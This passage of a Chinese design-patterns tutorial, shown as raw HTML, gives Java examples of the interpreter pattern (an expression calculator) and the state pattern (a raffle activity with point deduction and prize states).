class="hljs-keyword">break</span>;<br>         <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;-&#x27;</span>: <span class="hljs-comment">// </span><br>            left = stack.pop();<br>            right = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VarExpression</span>(String.valueOf(charArray[++i]));<br>            stack.push(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SubExpression</span>(left, right));<br>            <span class="hljs-keyword">break</span>;<br>         <span class="hljs-keyword">default</span>: <br>            <span class="hljs-comment">//如果是一个 Var 就创建要给 VarExpression 对象，并push到 stack</span><br>            stack.push(<span class="hljs-keyword">new</span> <span class="hljs-title class_">VarExpression</span>(String.valueOf(charArray[i])));<br>            <span class="hljs-keyword">break</span>;<br>         &#125;<br>      &#125;<br>      <span class="hljs-comment">//当遍历完整个 charArray 数组后，stack 就得到最后Expression</span><br>      <span class="hljs-built_in">this</span>.expression = stack.pop();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">run</span><span class="hljs-params">(HashMap&lt;String, Integer&gt; <span class="hljs-keyword">var</span>)</span> &#123;<br>      <span class="hljs-comment">//最后将表达式a+b和 var = &#123;a=10,b=20&#125;</span><br>      <span class="hljs-comment">//然后传递给expression的interpreter进行解释执行</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.expression.interpreter(<span class="hljs-keyword">var</span>);<br>   &#125;<br>&#125;```<br>`Client.java`<br>​```java<br><span class="hljs-keyword">package</span> io.xtwoy.interpreter;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">String</span> <span class="hljs-variable">expStr</span> <span class="hljs-operator">=</span> getExpStr(); <span class="hljs-comment">// a+b</span><br>      HashMap&lt;String, Integer&gt; <span class="hljs-keyword">var</span> = getValue(expStr);<span class="hljs-comment">// var &#123;a=10, b=20&#125;</span><br>      <span class="hljs-type">Calculator</span> <span class="hljs-variable">calculator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>(expStr);<br>      System.out.println(<span class="hljs-string">&quot;运算结果：&quot;</span> + expStr + <span class="hljs-string">&quot;=&quot;</span> + calculator.run(<span class="hljs-keyword">var</span>));<br>   &#125;<br><br>   <span class="hljs-comment">// 获得表达式</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getExpStr</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>      System.out.print(<span class="hljs-string">&quot;请输入表达式：&quot;</span>);<br>      <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in))).readLine();<br>   &#125;<br><br>   <span class="hljs-comment">// 获得值映射</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;String, Integer&gt; <span class="hljs-title function_">getValue</span><span class="hljs-params">(String expStr)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>      HashMap&lt;String, Integer&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch : expStr.toCharArray()) &#123;<br>         <span class="hljs-keyword">if</span> (ch != <span class="hljs-string">&#x27;+&#x27;</span> &amp;&amp; ch != <span class="hljs-string">&#x27;-&#x27;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (!map.containsKey(String.valueOf(ch))) &#123;<br>               System.out.print(<span class="hljs-string">&quot;请输入&quot;</span> + String.valueOf(ch) + <span class="hljs-string">&quot;的值：&quot;</span>);<br>               <span class="hljs-type">String</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in))).readLine();<br>               map.put(String.valueOf(ch), Integer.valueOf(in));<br>            &#125;<br>         &#125;<br>      &#125;<br><br>      <span class="hljs-keyword">return</span> map;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Expression.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.interpreter;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 抽象类表达式，通过HashMap 键值对, 可以获取到变量的值</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Expression</span> &#123;<br>   <span class="hljs-comment">// a + b - c</span><br>   <span class="hljs-comment">// 解释公式和数值, key 就是公式(表达式) 参数[a,b,c], value就是就是具体值</span><br>   <span class="hljs-comment">// HashMap &#123;a=10, b=20&#125;</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-type">int</span> <span class="hljs-title function_">interpreter</span><span class="hljs-params">(HashMap&lt;String, Integer&gt; <span class="hljs-keyword">var</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SubExpression.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.interpreter;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SubExpression</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SymbolExpression</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">SubExpression</span><span class="hljs-params">(Expression left, Expression right)</span> &#123;<br>      <span class="hljs-built_in">super</span>(left, right);<br>   &#125;<br><br>   <span class="hljs-comment">//求出left 和 right 表达式相减后的结果</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">interpreter</span><span class="hljs-params">(HashMap&lt;String, Integer&gt; <span class="hljs-keyword">var</span>)</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.left.interpreter(<span class="hljs-keyword">var</span>) - <span class="hljs-built_in">super</span>.right.interpreter(<span class="hljs-keyword">var</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SymbolExpression.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.interpreter;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 抽象运算符号解析器 这里，每个运算符号，都只和自己左右两个数字有关系，</span><br><span class="hljs-comment"> * 但左右两个数字有可能也是一个解析的结果，无论何种类型，都是Expression类的实现类</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SymbolExpression</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Expression</span> &#123;<br><br>   <span class="hljs-keyword">protected</span> Expression left;<br>   <span class="hljs-keyword">protected</span> Expression right;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">SymbolExpression</span><span class="hljs-params">(Expression left, Expression right)</span> &#123;<br>      <span class="hljs-built_in">this</span>.left = left;<br>      <span class="hljs-built_in">this</span>.right = right;<br>   &#125;<br><br>   <span class="hljs-comment">//因为 SymbolExpression 是让其子类来实现，因此 interpreter 是一个默认实现</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">interpreter</span><span class="hljs-params">(HashMap&lt;String, Integer&gt; <span class="hljs-keyword">var</span>)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>VarExpression.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.interpreter;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 变量的解释器</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VarExpression</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Expression</span> &#123;<br><br>   <span class="hljs-keyword">private</span> String key; <span class="hljs-comment">// key=a,key=b,key=c</span><br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">VarExpression</span><span class="hljs-params">(String key)</span> &#123;<br>      <span class="hljs-built_in">this</span>.key = key;<br>   &#125;<br><br>   <span class="hljs-comment">// var 就是&#123;a=10, b=20&#125;</span><br>   <span class="hljs-comment">// interpreter 根据 变量名称，返回对应值</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">interpreter</span><span class="hljs-params">(HashMap&lt;String, Integer&gt; <span class="hljs-keyword">var</span>)</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">var</span>.get(<span class="hljs-built_in">this</span>.key);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">请输入表达式：<span class="hljs-keyword">a</span>+b-c<br>请输入<span class="hljs-keyword">a</span>的值：<span class="hljs-number">10</span><br>请输入b的值：<span class="hljs-number">1</span><br>请输入c的值：<span class="hljs-number">5</span><br>运算结果：<span class="hljs-keyword">a</span>+b-c=<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><h2 id="解释器模式的注意事项和细节"><a class="markdownIt-Anchor" href="#解释器模式的注意事项和细节"></a> 解释器模式的注意事项和细节</h2><ol><li><p>当有一个语言需要解释执行，可将该语言中的句子表示为一个抽象语法树，就可以考虑使用解释器模式，让程序具有良好的扩展性</p></li><li><p>应用场景：编译器、运算表达式计算、正则表达式、机器人等</p></li><li><p>使用解释器可能带来的问题：解释器模式会引起类膨胀、解释器模式采用递归调用方法，将会导致调试非常复杂、效率可能降低</p></li></ol><h1 id="状态模式"><a class="markdownIt-Anchor" href="#状态模式"></a> 状态模式</h1><p>在状态模式（State Pattern）中，类的行为是基于它的状态改变的。这种类型的设计模式属于行为型模式。</p><h2 id="介绍-20"><a class="markdownIt-Anchor" href="#介绍-20"></a> 介绍</h2><p><strong>意图：</strong> 允许对象在内部状态发生改变时改变它的行为，对象看起来好像修改了它的类。</p><p><strong>主要解决：</strong> 对象的行为依赖于它的状态（属性），并且可以根据它的状态改变而改变它的相关行为。</p><p><strong>何时使用：</strong> 代码中包含大量与对象状态有关的条件语句。</p><p><strong>如何解决：</strong> 将各种具体的状态类抽象出来。</p><p><strong>关键代码：</strong><br />通常命令模式的接口中只有一个方法。而状态模式的接口中有一个或者多个方法。而且，状态模式的实现类的方法，一般返回值，或者是改变实例变量的值。也就是说，状态模式一般和对象的状态有关。实现类的方法有不同的功能，覆盖接口中的方法。状态模式和命令模式一样，也可以用于消除<br />if…else 等条件选择语句。</p><p><strong>应用实例：</strong> 1、打篮球的时候运动员可以有正常状态、不正常状态和超常状态。<br />2、曾侯乙编钟中，‘钟是抽象接口’,'钟A’等是具体状态，'曾侯乙编钟’是具体环境（Context）。</p><p><strong>优点：</strong> 1、封装了转换规则。 2、枚举可能的状态，在枚举状态之前需要确定状态种类。<br />3、将所有与某个状态有关的行为放到一个类中，并且可以方便地增加新的状态，只需要改变对象状态即可改变对象的行为。<br />4、允许状态转换逻辑与状态对象合成一体，而不是某一个巨大的条件语句块。 5、可以让多个环境对象共享一个状态对象，从而减少系统中对象的个数。</p><p><strong>缺点：</strong> 1、状态模式的使用必然会增加系统类和对象的个数。 2、状态模式的结构与实现都较为复杂，如果使用不当将导致程序结构和代码的混乱。<br />3、状态模式对&quot;开闭原则&quot;的支持并不太好，对于可以切换状态的状态模式，增加新的状态类需要修改那些负责状态转换的源代码，否则无法切换到新增状态，而且修改某个状态类的行为也需修改对应类的源代码。</p><p><strong>使用场景：</strong> 1、行为随状态改变而改变的场景。 2、条件、分支语句的代替者。</p><p><strong>注意事项：</strong> 在行为受状态约束的时候使用状态模式，而且状态不超过 5 个。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105110507630.png" alt="image-20230105110507630" /></p><p>对原理类图的说明-即(状态模式的角色及职责)</p><ol><li><p>Context 类为环境角色, 用于维护 State 实例,这个实例定义当前状态</p></li><li><p>State 是抽象状态角色,定义一个接口封装与 Context 的一个特点接口相关行为</p></li><li><p>ConcreteState 具体的状态角色，每个子类实现一个与 Context 的一个状态相关行为</p></li></ol><h2 id="实现-18"><a class="markdownIt-Anchor" href="#实现-18"></a> 实现</h2><h3 id="状态模式解决-app-抽奖问"><a class="markdownIt-Anchor" href="#状态模式解决-app-抽奖问"></a> 状态模式解决 APP 抽奖问</h3><ol><li>应用实例要求</li></ol><p>​1) 假如每参加一次这个活动要扣除用户 50 积分，中奖概率是 10%</p><p>​2) 奖品数量固定，抽完就不能抽奖</p><p>​3) 活动有四个状态: 可以抽奖、不能抽奖、发放奖品和奖品领完</p><p>​4) 活动的四个状态转换关系图(右图)</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105110700473.png" alt="image-20230105110700473" /></p><p>完成 APP 抽奖活动项目，使用状态模式.</p><ol start="2"><li>思路分析和图解(类图)</li></ol><p>-定义出一个接口叫状态接口，每个状态都实现它。</p><p>-接口有扣除积分方法、抽奖方法、发放奖品方法</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105140413812.png" alt="image-20230105140413812" /></p><p><code>CanRaffleState.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state;<br><br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 可以抽奖的状态</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CanRaffleState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">State</span> &#123;<br><br>    RaffleActivity activity;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CanRaffleState</span><span class="hljs-params">(RaffleActivity activity)</span> &#123;<br>        <span class="hljs-built_in">this</span>.activity = activity;<br>    &#125;<br><br>    <span class="hljs-comment">//已经扣除了积分，不能再扣</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deductMoney</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;已经扣取过了积分&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//可以抽奖, 抽完奖后，根据实际情况，改成新的状态</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">raffle</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;正在抽奖，请稍等！&quot;</span>);<br>        <span class="hljs-type">Random</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> r.nextInt(<span class="hljs-number">10</span>);<br>        <span class="hljs-comment">// 10%中奖机会</span><br>        <span class="hljs-keyword">if</span>(num == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-comment">// 改变活动状态为发放奖品 context</span><br>            activity.setState(activity.getDispenseState());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;很遗憾没有抽中奖品！&quot;</span>);<br>            <span class="hljs-comment">// 改变状态为不能抽奖</span><br>            activity.setState(activity.getNoRafflleState());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 不能发放奖品</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispensePrize</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;没中奖，不能发放奖品&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 状态模式测试类</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// 创建活动对象，奖品有1个奖品</span><br>        <span class="hljs-type">RaffleActivity</span> <span class="hljs-variable">activity</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RaffleActivity</span>(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">// 我们连续抽30次奖</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30</span>; i++) &#123;<br>            System.out.println(<span class="hljs-string">&quot;--------第&quot;</span> + (i + <span class="hljs-number">1</span>) + <span class="hljs-string">&quot;次抽奖----------&quot;</span>);<br>            <span class="hljs-comment">// 参加抽奖，第一步点击扣除积分</span><br>            activity.debuctMoney();<br><br>            <span class="hljs-comment">// 第二步抽奖</span><br>            activity.raffle();<br>        &#125;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>DispenseOutState.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 奖品发放完毕状态</span><br><span class="hljs-comment"> * 说明，当我们activity 改变成 DispenseOutState， 抽奖活动结束</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispenseOutState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">State</span> &#123;<br><br>   <span class="hljs-comment">// 初始化时传入活动引用</span><br>    RaffleActivity activity;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DispenseOutState</span><span class="hljs-params">(RaffleActivity activity)</span> &#123;<br>        <span class="hljs-built_in">this</span>.activity = activity;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deductMoney</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;奖品发送完了，请下次再参加&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">raffle</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;奖品发送完了，请下次再参加&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispensePrize</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;奖品发送完了，请下次再参加&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>DispenseState.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 发放奖品的状态</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispenseState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">State</span> &#123;<br><br>    <span class="hljs-comment">// 初始化时传入活动引用，发放奖品后改变其状态</span><br>    RaffleActivity activity;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DispenseState</span><span class="hljs-params">(RaffleActivity activity)</span> &#123;<br>        <span class="hljs-built_in">this</span>.activity = activity;<br>    &#125;<br>    <br>    <span class="hljs-comment">//</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deductMoney</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;不能扣除积分&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">raffle</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;不能抽奖&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//发放奖品</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispensePrize</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span>(activity.getCount() &gt; <span class="hljs-number">0</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;恭喜中奖了&quot;</span>);<br>            <span class="hljs-comment">// 改变状态为不能抽奖</span><br>            activity.setState(activity.getNoRafflleState());<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;很遗憾，奖品发送完了&quot;</span>);<br>            <span class="hljs-comment">// 改变状态为奖品发送完毕, 后面我们就不可以抽奖</span><br>            activity.setState(activity.getDispensOutState());<br>            <span class="hljs-comment">//System.out.println(&quot;抽奖活动结束&quot;);</span><br>            <span class="hljs-comment">//System.exit(0);</span><br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>NoRaffleState.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 